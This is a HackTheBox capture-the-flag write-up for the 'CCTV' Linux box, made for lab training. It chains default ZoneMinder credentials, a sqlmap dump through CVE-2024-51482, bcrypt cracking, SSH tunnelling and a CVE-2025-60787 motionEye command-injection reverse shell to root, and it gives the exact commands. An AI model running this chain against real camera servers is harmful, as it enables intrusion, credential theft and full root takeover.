# CCTV — HackTheBox Writeup

**Difficulty:** Easy (rated Medium by community)
**OS:** Linux (Ubuntu 24.04)
**Season:** 10
**CVEs:** CVE-2024-51482 · CVE-2025-60787

---

## Attack Chain Summary

```
nmap → ZoneMinder 1.37.63 (default creds)
  └→ CVE-2024-51482: blind SQLi → dump zm.Users
      └→ crack mark:opensesame → SSH foothold
          └→ motionEye on localhost:8765 (running as root)
              └→ SSH tunnel → CVE-2025-60787: command injection → root shell
```

---

## Enumeration

### Port Scan

```bash
nmap -sV -sC -p- --min-rate 5000 -Pn cctv.htb -oN cctv_initial.txt
```

```
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu
80/tcp open  http    Apache httpd 2.4.58
```

Only two ports. The web server redirects to a company landing page for "SecureVision CCTV & Security Solutions."

### Web Enumeration

The homepage HTML reveals a staff login button pointing to `/zm` — a ZoneMinder installation.

```bash
curl -s http://cctv.htb | grep href
# → href="http://cctv.htb/zm"
```

**Mindset:** Always read page source. Navigation links, comments, and JS variables leak software names and internal paths.

### Software Identification

Visiting `/zm/` shows a ZoneMinder login page. Version is exposed in the post-login JavaScript:

```javascript
const ZM_DYN_CURR_VERSION = '1.37.63';
```

**Always check the page source after login** — configuration constants, auth tokens, and version strings are commonly exposed in JS variables.

---

## Initial Access

### Default Credentials

Before running any exploit, try the obvious:

```bash
curl -s -X POST http://cctv.htb/zm/index.php \
  -d "view=login&action=login&username=admin&password=admin" \
  -c cookies.txt -o /dev/null
```

The response contains `currentView = 'postlogin'` and a populated `user` object — login succeeded with `admin:admin`.

**Lesson:** Default credentials are always step one. A significant portion of real-world breaches start here.

### CVE-2024-51482 — Blind SQL Injection

ZoneMinder 1.37.63 is vulnerable to boolean/time-based blind SQL injection via the `tid` parameter in the `removetag` action.

**Vulnerable code:**
```php
case 'removetag':
    $tagId = $_REQUEST['tid'];
    // ...
    $sql = "SELECT * FROM Events_Tags WHERE TagId = $tagId"; // unsanitized
```

**Patch:** Replace with a parameterized query using `?` placeholder.

**Vulnerable endpoint:**
```
GET /zm/index.php?view=request&request=event&action=removetag&tid=1
```

The endpoint is not directly at `ajax/event.php` — requests must be routed through ZoneMinder's MVC dispatcher with `view=request&request=event`.

### Extracting Credentials with sqlmap

Refresh session cookie first (expires after 1 hour):

```bash
curl -s -X POST http://cctv.htb/zm/index.php \
  -d "view=login&action=login&username=admin&password=admin" \
  -c cookies.txt -o /dev/null
```

Enumerate databases:

```bash
sqlmap -u "http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1" \
  --cookie="ZMSESSID=<value>" \
  --batch --dbs
```

Results: `information_schema`, `performance_schema`, `zm`

Dump credentials (use `--hex` to avoid special character errors with bcrypt hashes, `--technique=T` for time-based):

```bash
sqlmap -u "http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1" \
  --cookie="ZMSESSID=<value>" \
  --batch \
  -D zm -T Users -C Username,Password \
  --dump --technique=T --hex --flush-session
```

**Results:**

| Username   | Password Hash                                                |
|------------|--------------------------------------------------------------|
| admin      | `$2y$10$t5z8uIT...` (bcrypt — admin:admin)                  |
| superadmin | `$2y$10$cmytVWF...` (bcrypt — not in rockyou)               |
| mark       | `$2y$10$prZGnaz...` (bcrypt)                                 |

**SQLi notes:**
- Time-based blind is the only working technique (boolean fails — both true/false return 500)
- bcrypt hashes contain `$`, `/`, `.` which cause "invalid character" errors — `--hex` resolves this
- Over VPN, time delays compound — session will expire during long extractions; re-auth and resume

### Password Cracking

```bash
# Mode 3200 = bcrypt
hashcat -m 3200 hash.txt rockyou.txt
```

Run on GPU (Windows native, not WSL) for practical speed. RTX 4060: ~750 H/s.

**Cracked:** `mark : opensesame`

`superadmin`'s hash did not crack against rockyou.

### SSH Foothold

```bash
ssh mark@cctv.htb
# password: opensesame
```

---

## Post-Exploitation Enumeration

### Internal Services

```bash
ss -tlnp
```

Key findings:
```
127.0.0.1:8765   # motionEye web interface
127.0.0.1:7999   # Motion daemon control
127.0.0.1:9081   # unknown
127.0.0.1:8888   # unknown
```

**Mindset:** `ss -tlnp` is always the first command after getting a shell. Services bound to localhost are invisible from outside — they're a primary privesc target.

### motionEye Discovery

```bash
cat /etc/systemd/system/motioneye.service
```

```ini
[Service]
User=root   # ← critical
ExecStart=/usr/local/bin/meyectl startserver -c /etc/motioneye/motioneye.conf
```

motionEye runs as **root**. Anything we can make it execute runs as root.

```bash
cat /etc/motioneye/motion.conf
```

```
# @admin_username admin
# @normal_username user
# @normal_password          ← empty password for surveillance user
webcontrol_port 7999
```

The `user` account has no password. The admin password hash is SHA1: `989c5a8ee87a0e9521ec81a79187d162109282f0`

```bash
curl -s http://127.0.0.1:8765 | grep -i version
# motionEye/0.43.1b4  ← vulnerable version
```

---

## Privilege Escalation

### SSH Local Port Forwarding

motionEye only listens on localhost. Expose it to your attack machine:

```bash
# On your attack machine (separate terminal)
ssh -L 8765:127.0.0.1:8765 mark@cctv.htb -N
```

Verify:
```bash
curl -s http://127.0.0.1:8765 | head -3
# → <!DOCTYPE html>
```

### CVE-2025-60787 — motionEye Command Injection

motionEye ≤ 0.43.1b4 is vulnerable to command injection via a configuration parameter. The payload executes when the Motion service reloads its configuration. Since motionEye runs as root, the injected command executes as root.

**Setup listener:**
```bash
nc -lvnp 4444
```

**Run exploit:**
```bash
python3 CVE-2025-60787.py revshell \
  --url 'http://127.0.0.1:8765' \
  --user 'admin' \
  --password '989c5a8ee87a0e9521ec81a79187d162109282f0' \
  -i <tun0_ip> \
  --port 4444
```

Check your tun0 IP before running:
```bash
ip addr show tun0 | grep "inet "
```

**Result:**
```
Connection received on 10.129.x.x
root@cctv:/etc/motioneye# id
uid=0(root) gid=0(root) groups=0(root)
```

---

## Flags

```bash
cat /home/sa_mark/user.txt   # user flag
cat /root/root.txt            # root flag
```

---

## Key Takeaways

| Lesson | Application |
|--------|-------------|
| Default credentials first | `admin:admin` gave ZoneMinder access before any exploit |
| Version → CVE research | ZoneMinder 1.37.63 → CVE-2024-51482 |
| SQLi technique selection | Time-based works; boolean fails when both conditions return 500 |
| `--hex` flag | Solves special character extraction issues with bcrypt |
| Session management | ZoneMinder sessions expire in 1hr — re-auth before long sqlmap runs |
| `ss -tlnp` after foothold | Revealed motionEye and other internal services |
| SSH tunneling | Exposed localhost-only service to attack machine |
| Service privilege audit | motionEye running as root = instant privilege escalation |
| GPU cracking | bcrypt on CPU = 22hrs; RTX 4060 = ~5hrs. Always use native GPU |

---

## Tools Used

- `nmap` — port/service enumeration
- `curl` — manual web interaction and auth
- `sqlmap` — automated SQL injection with `--hex --technique=T`
- `hashcat` — bcrypt (mode 3200) and SHA1 (mode 100) cracking
- `ssh -L` — local port forwarding
- `CVE-2025-60787.py` — motionEye command injection PoC
- `nc` — reverse shell listener

---

## References

- [CVE-2024-51482 — ZoneMinder SQLi](https://github.com/ZoneMinder/zoneminder/security/advisories)
- [CVE-2025-60787 — motionEye Command Injection](https://github.com/motioneye-project/motioneye)
- [HackTricks — SQL Injection](https://book.hacktricks.xyz/pentesting-web/sql-injection)
- [HackTricks — SSH Tunneling](https://book.hacktricks.xyz/generic-methodologies-and-resources/tunneling-and-port-forwarding)
